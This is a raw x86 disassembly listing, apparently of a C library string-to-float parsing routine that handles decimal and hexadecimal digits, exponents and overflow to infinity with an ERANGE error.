inc ebx
mov eax, dword [ebp + ebx*4 - 0x2c]
test eax, eax
je 0x8086932
xor eax, eax
mov esi, dword [var_7ch]
cmp dword [var_80h], esi
jl 0x808694d
cmp ebx, dword [var_b0h]
jge 0x8086952
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_b0h]
mov ecx, dword [var_60h]
mov eax, dword [var_b4h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0x2c]
mov dword [var_ch], eax
mov eax, dword [var_6ch]
dec eax
mov dword [var_4h], eax
lea esi, [var_54h]
mov dword [esp], esi
call fcn.08085e00
fstp dword [ebp - 0x104]
mov eax, dword [var_104h]
jmp 0x80863f6
lea eax, [esi - 1]
mov ebx, edi
cmp edi, eax
jge 0x80869eb
mov dword [var_108h], 0x20
mov ecx, dword [var_ach]
mov dword [var_b8h], eax
sub dword [var_108h], ecx
lea esi, [var_54h]
movzx ecx, byte [var_ach]
mov edx, dword [ebp + ebx*4 - 0x2c]
mov eax, dword [ebp + ebx*4 - 0x28]
inc ebx
shr edx, cl
movzx ecx, byte [var_108h]
shl eax, cl
or edx, eax
mov dword [esi], edx
add esi, 4
cmp ebx, dword [var_b8h]
jl 0x80869c1
mov eax, ebx
sub eax, edi
test eax, eax
jg 0x8086929
movzx ecx, byte [var_ach]
mov eax, dword [ebp + ebx*4 - 0x2c]
shr eax, cl
jmp 0x8086926
mov eax, dword [var_80h]
cmp dword [var_7ch], eax
je 0x8087413
lea ecx, [esi*4]
lea edi, [var_54h]
lea esi, [var_2ch]
cld
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov esi, 0x1a
lea eax, [var_4ch]
lea edx, [var_2ch]
sub esi, dword [var_6ch]
mov dword [var_c8h], eax
mov dword [var_cch], edx
mov edx, 0x55555556
mov ecx, dword [var_7ch]
mov dword [var_d0h], 0x80a7020
sub ecx, dword [var_80h]
mov dword [var_c4h], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x8086a87
mov ecx, dword [var_80h]
mov dword [var_c4h], 1
lea edx, [edx + ecx + 2]
mov dword [var_7ch], edx
mov esi, dword [var_7ch]
mov dword [var_68h], 0
sub esi, dword [var_80h]
sub esi, ebx
mov ebx, 1
mov dword [var_c0h], esi
test dword [var_c0h], ebx
je 0x8086ae3
mov eax, dword [var_68h]
xor dword [var_c0h], ebx
test eax, eax
jne 0x80873a0
mov eax, dword [var_d0h]
mov edi, dword [var_c8h]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_68h], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_c0h]
add ebx, ebx
add dword [var_d0h], 0x10
test eax, eax
jne 0x8086aa1
lea eax, [var_2ch]
cmp dword [var_c8h], eax
je 0x808738a
mov edx, dword [var_8ch]
mov esi, dword [var_88h]
lea eax, [var_58h]
mov ecx, dword [var_94h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_5ch]
mov esi, dword [var_80h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_7ch], esi
mov edx, dword [var_70h]
lea ecx, [var_2ch]
mov eax, dword [var_7ch]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08086060
mov ecx, dword [var_68h]
bsr eax, dword [ebp + ecx*4 - 0x50]
mov ebx, eax
xor ebx, 0x1f
jle 0x8086ba1
lea esi, [var_4ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_5ch]
lea edx, [var_2ch]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x8086ba1
mov eax, dword [var_5ch]
mov dword [ebp + eax*4 - 0x2c], edx
inc eax
mov dword [var_5ch], eax
cmp dword [var_68h], 1
mov esi, dword [var_6ch]
mov dword [var_58h], esi
je 0x8087273
cmp dword [var_68h], 2
je 0x8086fef
mov eax, dword [var_68h]
mov ecx, dword [var_68h]
mov dword [var_e8h], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x54]
mov esi, dword [ebp + eax*4 - 0x50]
mov eax, dword [var_5ch]
mov dword [var_e4h], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x4c]
mov dword [var_4h], eax
lea eax, [var_2ch]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x8086c0a
mov eax, dword [var_5ch]
mov dword [ebp + eax*4 - 0x2c], 0
inc eax
mov dword [var_5ch], eax
mov edx, dword [var_5ch]
cmp edx, dword [var_68h]
jge 0x8086fd5
mov ecx, dword [var_68h]
mov eax, dword [var_6ch]
sub ecx, edx
test eax, eax
mov dword [var_ech], ecx
jle 0x8086f8a
mov eax, dword [var_ech]
shl eax, 5
add eax, dword [var_6ch]
cmp eax, 0x18
jg 0x8086ed6
test edx, edx
mov dword [var_54h], 0
mov ecx, edx
jle 0x8086c64
mov eax, dword [var_ech]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x30]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x2c], eax
jg 0x8086c4e
mov edx, dword [var_ech]
xor eax, eax
inc edx
cmp eax, edx
jge 0x8086c7e
mov dword [ebp + eax*4 - 0x2c], 0
inc eax
cmp eax, edx
jl 0x8086c71
shl dword [var_ech], 5
mov edx, dword [var_ech]
add dword [var_6ch], edx
mov eax, dword [var_68h]
cmp dword [var_6ch], 0x18
mov dword [ebp + eax*4 - 0x4c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0x2c]
mov ebx, eax
jg 0x8086ddb
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_f8h], ecx
mov dword [var_f4h], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x8086d0f
mov edx, dword [var_68h]
mov eax, dword [ebp + edx*4 - 0x30]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_e4h]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x8086ebe
add ecx, esi
dec edi
cmp ecx, esi
jb 0x8086d0f
cmp ebx, dword [var_e4h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_e4h]
cmp edx, ecx
ja 0x8086ce7
jne 0x8086d0f
mov eax, dword [var_68h]
cmp ebx, dword [ebp + eax*4 - 0x34]
ja 0x8086ce7
mov edx, dword [var_f8h]
lea ecx, [var_4ch]
lea eax, [var_2ch]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_68h]
cmp dword [ebp + edx*4 - 0x2c], eax
je 0x8086d53
lea eax, [var_2ch]
lea ecx, [var_4ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_68h]
mov edx, dword [var_f4h]
mov eax, dword [ebp + ecx*4 - 0x30]
test edx, edx
mov dword [ebp + ecx*4 - 0x2c], eax
mov ebx, eax
jle 0x8086d77
mov eax, dword [ebp + edx*4 - 0x30]
mov dword [ebp + edx*4 - 0x2c], eax
dec edx
test edx, edx
jg 0x8086d6a
mov eax, dword [var_6ch]
test eax, eax
jne 0x8086e4c
test edi, edi
mov edx, 0x20
je 0x8086d91
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_58h], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x18
jle 0x8086e39
add edx, 0x18
mov eax, edi
mov dword [var_fch], 0x39
sub ecx, edx
mov dword [var_e8h], edx
shr eax, cl
mov dword [var_54h], eax
mov ecx, dword [var_fch]
cmp ecx, 0x18
mov dword [var_6ch], ecx
jle 0x8086cbd
mov esi, dword [var_68h]
mov eax, dword [ebp + esi*4 - 0x2c]
test eax, eax
mov edx, dword [var_68h]
jne 0x8086df3
test edx, edx
js 0x8086df3
dec edx
mov ebx, dword [ebp + edx*4 - 0x2c]
test ebx, ebx
jne 0x8086df3
test edx, edx
jns 0x8086de6
mov ecx, dword [var_c4h]
xor eax, eax
test ecx, ecx
jne 0x8086e03
test edx, edx
js 0x8086e08
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_54h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_e8h]
mov dword [var_10h], eax
mov eax, dword [var_60h]
mov dword [var_8h], eax
mov eax, dword [var_58h]
dec eax
mov dword [var_4h], eax
jmp 0x8086983
neg edx
mov dword [var_54h], edi
add edx, 0x20
mov dword [var_fch], edx
jmp 0x8086dc2
mov eax, dword [var_6ch]
add eax, 0x20
cmp eax, 0x18
mov dword [var_fch], eax
jg 0x8086e65
mov dword [var_54h], edi
jmp 0x8086dc2
mov dword [var_e8h], 0x18
mov edx, dword [var_6ch]
sub dword [var_e8h], edx
mov eax, dword [var_e8h]
test eax, eax
jle 0x8086dc2
mov ecx, dword [var_e8h]
lea eax, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_e8h]
shr eax, cl
or dword [var_54h], eax
jmp 0x8086dc2
jne 0x8086d0f
mov eax, dword [var_68h]
cmp ebx, dword [ebp + eax*4 - 0x34]
ja 0x8086ce7
jmp 0x8086d0f
mov dword [var_e8h], 0x18
mov edx, dword [var_6ch]
sub dword [var_e8h], edx
cmp dword [var_e8h], 0x1f
jle 0x8086f56
mov ebx, dword [var_e8h]
mov ecx, dword [var_e8h]
mov dword [var_8h], 1
add ebx, 0x1f
cmp dword [var_e8h], 0xffffffff
cmovg ebx, dword [var_e8h]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_54h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x54]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x8086c7e
lea edx, [ebp + eax*4 - 0x54]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x8086f45
jmp 0x8086c7e
mov eax, dword [var_e8h]
test eax, eax
jle 0x8086c7e
mov edx, dword [var_e8h]
lea ecx, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x8086c7e
test edx, edx
mov ecx, edx
jle 0x8086fa6
mov eax, dword [var_ech]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x30]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x2c], eax
jg 0x8086f90
mov edx, dword [var_ech]
xor eax, eax
inc edx
cmp eax, edx
jge 0x8086fc0
mov dword [ebp + eax*4 - 0x2c], 0
inc eax
cmp eax, edx
jl 0x8086fb3
shl dword [var_ech], 5
mov edx, dword [var_ech]
sub dword [var_58h], edx
jmp 0x8086c8e
test edx, edx
jle 0x8086c8e
mov eax, dword [ebp + edx*4 - 0x30]
mov dword [ebp + edx*4 - 0x2c], eax
dec edx
test edx, edx
jg 0x8086fdd
jmp 0x8086c8e
cmp dword [var_5ch], 1
mov eax, dword [var_48h]
mov dword [var_dch], 0
mov dword [var_e0h], 0
mov edi, dword [var_4ch]
mov dword [var_d8h], eax
jle 0x80871ec
mov esi, dword [var_28h]
mov ebx, dword [var_2ch]
cmp dword [var_6ch], 0x18
jg 0x80870e1
cmp esi, dword [var_d8h]
je 0x80871b8
mov eax, ebx
mov edx, esi
div dword [var_d8h]
mov ecx, edx
mov dword [var_dch], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x8087057
jne 0x8087070
test ebx, ebx
je 0x8087070
add ecx, dword [var_d8h]
dec dword [var_dch]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_d8h]
jae 0x808704d
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_6ch]
test eax, eax
jne 0x808713c
mov eax, dword [var_dch]
mov edx, 0x20
test eax, eax
je 0x808709e
bsr edx, dword [var_dch]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_58h], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x18
jle 0x8087126
mov eax, dword [ebp - 0xdc]
add edx, 0x18
mov dword [ebp - 0xfc], 0x39
sub ecx, edx
mov dword [ebp - 0xe0], edx
shr eax, cl
mov dword [ebp - 0x54], eax
mov eax, dword [ebp - 0xfc]
cmp eax, 0x18
mov dword [ebp - 0x6c], eax
jle 0x8087029
mov edx, dword [var_c4h]
xor eax, eax
test edx, edx
jne 0x80870f5
test esi, esi
jne 0x80870f5
test ebx, ebx
je 0x80870fa
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_dch]
mov eax, 0x1f
sub eax, dword [var_e0h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_60h]
mov eax, dword [var_58h]
mov dword [var_8h], ecx
jmp 0x8086978
mov ecx, dword [ebp - 0xdc]
neg edx
add edx, 0x20
mov dword [ebp - 0xfc], edx
mov dword [ebp - 0x54], ecx
jmp 0x80870cf
mov eax, dword [var_6ch]
add eax, 0x20
cmp eax, 0x18
mov dword [var_fch], eax
jg 0x808715b
mov edx, dword [var_dch]
mov dword [var_54h], edx
jmp 0x80870cf
mov dword [var_e0h], 0x18
mov ecx, dword [var_6ch]
sub dword [var_e0h], ecx
mov ecx, dword [var_e0h]
test ecx, ecx
jle 0x80870cf
mov eax, dword [ebp - 0xe0]
lea edx, [ebp - 0x54]
mov dword [esp + 8], 1
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0xdc]
mov ecx, 0x20
sub ecx, dword [ebp - 0xe0]
shr eax, cl
or dword [ebp - 0x54], eax
jmp 0x80870cf
lea ecx, [esi + ebx]
mov dword [var_dch], 0xffffffff
cmp ecx, esi
jb 0x80871dc
test edi, edi
mov esi, edi
lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x808704d
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x808707a
mov eax, dword [var_2ch]
cmp eax, dword [var_d8h]
jb 0x8087200
xor esi, esi
mov ebx, eax
jmp 0x808701f
mov ecx, dword [var_6ch]
test ecx, ecx
jle 0x8087268
mov ebx, dword [var_6ch]
add ebx, 0x20
cmp ebx, 0x18
jg 0x8087225
mov dword [var_54h], 0
mov dword [var_6ch], ebx
mov esi, eax
xor ebx, ebx
jmp 0x808701f
mov dword [var_e0h], 0x18
mov edx, dword [var_6ch]
sub dword [var_e0h], edx
mov edx, dword [var_e0h]
test edx, edx
jle 0x8087219
mov ecx, dword [var_e0h]
lea esi, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, dword [var_2ch]
jmp 0x8087219
mov ebx, dword [var_6ch]
sub ebx, 0x20
mov dword [var_58h], ebx
jmp 0x808721c
mov dword [var_d4h], 0
mov ebx, dword [var_2ch]
mov edi, dword [var_4ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_6ch]
test eax, eax
jne 0x808731f
test esi, esi
mov edx, 0x20
je 0x80872a7
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_58h], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x18
jle 0x808730f
add edx, 0x18
mov eax, esi
mov dword [var_fch], 0x39
sub ecx, edx
mov dword [var_d4h], edx
shr eax, cl
mov dword [var_54h], eax
mov edx, dword [var_fch]
cmp edx, 0x18
mov dword [var_6ch], edx
jle 0x8087283
mov edi, dword [var_c4h]
xor eax, eax
test edi, edi
jne 0x80872f2
test ebx, ebx
je 0x80872f7
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_d4h]
jmp 0x8087113
neg edx
mov dword [var_54h], esi
add edx, 0x20
mov dword [var_fch], edx
jmp 0x80872d4
mov ecx, dword [var_6ch]
add ecx, 0x20
cmp ecx, 0x18
mov dword [var_fch], ecx
jg 0x8087335
mov dword [var_54h], esi
jmp 0x80872d4
mov dword [var_d4h], 0x18
mov eax, dword [var_6ch]
sub dword [var_d4h], eax
mov eax, dword [var_d4h]
test eax, eax
jle 0x80872d4
mov edx, dword [var_d4h]
lea ecx, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_d4h]
shr eax, cl
or dword [var_54h], eax
jmp 0x80872d4
mov ecx, dword [var_68h]
lea edi, [var_4ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x8086b05
mov edx, dword [var_d0h]
mov ecx, dword [var_68h]
mov esi, dword [var_c8h]
mov dword [var_10h], ecx
mov ecx, dword [var_cch]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_c8h]
mov esi, dword [var_d0h]
mov edx, dword [var_68h]
add edx, dword [esi + 4]
mov esi, dword [var_cch]
mov dword [var_cch], edi
mov dword [var_c8h], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_68h], edx
jmp 0x8086ae3
mov eax, dword [var_6ch]
mov edx, dword [var_6ch]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_bch], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x17
je 0x80874f0
cmp edx, 0x16
jg 0x80874aa
mov eax, 0x17
mov ebx, 1
lea ecx, [var_2ch]
sub eax, edx
mov dword [var_8h], esi
mov dword [var_4h], ecx
mov dword [var_ch], eax
mov eax, ebx
sub eax, esi
lea eax, [ebp + eax*4 - 0x54]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_5ch]
test eax, eax
jle 0x808747c
lea edx, [var_54h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x8087470
mov edx, dword [var_60h]
mov ecx, dword [var_bch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], edx
mov dword [var_4h], ecx
jmp 0x808697d
lea eax, [edx - 0x17]
lea edi, [var_54h]
mov dword [var_8h], esi
mov dword [var_ch], eax
lea eax, [var_2ch]
mov dword [var_4h], eax
mov eax, 1
sub eax, esi
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, dword [var_5ch]
neg edx
test edx, edx
mov dword [ebp + edx*4 - 0x54], eax
jle 0x808747c
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x80874e2
jmp 0x808747c
mov eax, 1
lea ecx, [esi*4]
mov edi, eax
shr ecx, 2
sub edi, esi
lea esi, [var_2ch]
lea edi, [ebp + edi*4 - 0x54]
cld
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_5ch]
test eax, eax
jle 0x808747c
lea edx, [var_54h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808751b
jmp 0x808747c
mov ecx, dword [var_5ch]
lea edi, [var_2ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808689f
mov dword [var_10h], edx
mov ecx, dword [var_a0h]
mov dword [var_8h], esi
mov edx, dword [var_a8h]
mov dword [var_ch], ecx
mov ecx, dword [var_a4h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x8086849
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x80864a6
mov ecx, dword [var_80h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x8086765
mov eax, ecx
jmp 0x8086765
mov eax, dword [var_70h]
mov ecx, dword [arg_14h]
mov dword [var_9ch], 0
mov esi, 0x17
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x80875cf
inc dword [var_70h]
mov eax, dword [var_70h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x80875bc
cmp dl, 0x30
je 0x808774b
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x8087737
inc dword [var_70h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a60c0]
dec dword [var_7ch]
mov dword [var_6ch], eax
mov eax, esi
sub eax, dword [var_6ch]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_6ch]
mov dword [var_54h], edx
mov edx, dword [var_80h]
lea eax, [ecx + edx*4]
add eax, dword [var_58h]
lea ebx, [eax - 5]
mov eax, dword [var_7ch]
mov dword [var_58h], ebx
test eax, eax
jle 0x8087683
mov eax, dword [var_9ch]
lea ebx, [ebp + eax*4 - 0x54]
mov ecx, dword [var_70h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x8087649
mov eax, dword [var_94h]
add ecx, eax
mov dword [var_70h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x8087723
inc dword [var_70h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x80876d3
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_7ch]
mov eax, dword [var_7ch]
test eax, eax
jle 0x8087683
mov eax, dword [var_9ch]
test eax, eax
jns 0x808762b
mov edi, dword [var_9ch]
test edi, edi
jle 0x80876a2
lea edx, [var_54h]
mov eax, dword [var_9ch]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x8087696
mov eax, dword [var_58h]
mov esi, dword [var_60h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], esi
lea eax, [var_54h]
mov dword [esp], eax
jmp 0x8086983
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_9ch]
js 0x80876fb
mov dword [ebx], edx
add esi, 0x1c
jmp 0x808766f
xor eax, eax
mov ecx, dword [var_60h]
mov dword [var_10h], 0x1f
cmp dword [var_7ch], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_58h]
jmp 0x8086979
mov ecx, dword [arg_14h]
inc dword [var_70h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808765d
mov ecx, dword [arg_14h]
inc dword [var_70h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x80875ec
inc dword [var_70h]
mov ecx, dword [var_70h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x808774b
jmp 0x80875d8
mov eax, dword [var_84h]
mov edx, dword [var_58h]
shl eax, 2
sub edx, eax
jmp 0x8086737
test al, al
jne 0x80866de
jmp 0x8086715
mov esi, esi
mov ecx, dword [var_88h]
movzx eax, byte [ecx + 1]
jmp 0x8087771
mov esi, dword [arg_ch]
test esi, esi
jne 0x80864a1
jmp 0x80864a6
mov edi, dword [arg_ch]
test edi, edi
je 0x80864a6
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x80864a6
mov eax, dword [var_88h]
movzx eax, byte [eax]
mov byte [var_fdh], al
mov edx, dword [var_7ch]
xor eax, eax
test edx, edx
mov dword [var_80h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_fdh], 0
mov dword [var_84h], eax
je 0x8087aca
mov ecx, dword [var_88h]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8087803
mov edx, dword [var_88h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x80877ef
test al, al
jne 0x8087ac3
add edi, dword [var_94h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8087a88
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x8087846
mov eax, dword [var_7ch]
sub eax, dword [var_80h]
cmp dword [var_84h], 0xffffffff
cmovne eax, dword [var_84h]
mov dword [var_84h], eax
inc dword [var_7ch]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8087825
cmp dword [var_64h], 0x10
mov edx, esi
movsx eax, dl
jne 0x808786c
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808786c
cmp edx, 0x66
jle 0x8087825
cmp dword [var_64h], 0x10
mov dword [var_78h], edi
je 0x8087a7f
cmp dword [ecx + eax*4], 0x65
je 0x8087932
mov esi, dword [var_80h]
cmp dword [var_7ch], esi
jle 0x8087898
mov eax, dword [var_78h]
cmp byte [eax - 1], 0x30
je 0x808791e
mov ecx, dword [var_80h]
cmp dword [var_7ch], ecx
jne 0x8086680
mov eax, dword [var_7ch]
test eax, eax
jle 0x8086680
mov ebx, dword [var_58h]
test ebx, ebx
jns 0x8086680
cmp dword [var_64h], 0x10
je 0x8087905
mov eax, dword [var_78h]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
cmp eax, 9
ja 0x8087900
cmp cl, 0x30
jne 0x8086680
dec dword [var_7ch]
inc ebx
dec dword [var_78h]
mov esi, dword [var_7ch]
dec dword [var_80h]
mov dword [var_58h], ebx
test esi, esi
jle 0x8086680
test ebx, ebx
js 0x80878ba
jmp 0x8086680
lea esi, [esi]
dec dword [var_78h]
jmp 0x80878ba
mov esi, dword [var_78h]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x80878d2
jmp 0x8087900
dec dword [var_78h]
dec dword [var_7ch]
mov edx, dword [var_78h]
cmp byte [edx - 1], 0x30
je 0x808791e
jmp 0x8087898
inc edi
mov dword [var_98h], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x8087a73
cmp al, 0x2b
je 0x8087a6a
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8087a62
cmp dword [var_64h], 0x10
je 0x8087a32
mov edx, dword [var_98h]
test edx, edx
je 0x8087a21
mov edx, dword [var_80h]
add edx, 0x3d
mov eax, dword [var_58h]
lea eax, [eax + eax*4]
lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_58h], ebx
jg 0x80879ba
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_58h], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808797b
mov eax, dword [var_98h]
test eax, eax
je 0x8087883
neg ebx
mov dword [var_58h], ebx
jmp 0x8087883
cmp dword [var_84h], 0xffffffff
je 0x8087a0e
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_98h]
test eax, eax
jne 0x8087a07
mov eax, dword [var_60h]
mov edx, 0x7f800000
test eax, eax
cmovne edx, dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x80879e9
mov eax, dword [arg_ch]
test eax, eax
je 0x8087a00
mov ecx, dword [arg_ch]
mov dword [ecx], edi
mov eax, edx
jmp 0x80863f6
mov edx, 0
jmp 0x80879e9
mov eax, dword [var_60h]
mov edx, 0
test eax, eax
cmovne edx, dword [0x80a6104]
jmp 0x80879e9
mov eax, dword [var_84h]
sub eax, dword [var_80h]
lea edx, [eax + 0x26]
jmp 0x808797b
mov ebx, dword [var_98h]
mov ecx, dword [var_80h]
test ebx, ebx
lea edx, [ecx*4 + 0x95]
jne 0x808797b
mov edx, dword [var_84h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x80]
jmp 0x808797b
mov edi, dword [var_78h]
jmp 0x8087883
inc edi
movzx esi, byte [edi]
jmp 0x8087952
mov dword [var_98h], 1
jmp 0x8087a6a
cmp dword [ecx + eax*4], 0x70
jmp 0x808787d
cmp dword [var_64h], 0x10
je 0x8087a9e
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x808786c
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808786c
cmp edx, 0x66
jle 0x8087825
jmp 0x808786c
mov edx, esi
movsx eax, dl
jmp 0x8087a93
mov ecx, dword [var_88h]
movzx eax, byte [ecx]
jmp 0x8087803
mov ecx, dword [var_8ch]
movzx eax, byte [ecx]
jmp 0x80865ec
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x80865b5
cmp eax, 0x66
ja 0x80865b5
inc dword [var_7ch]
jmp 0x80865e6
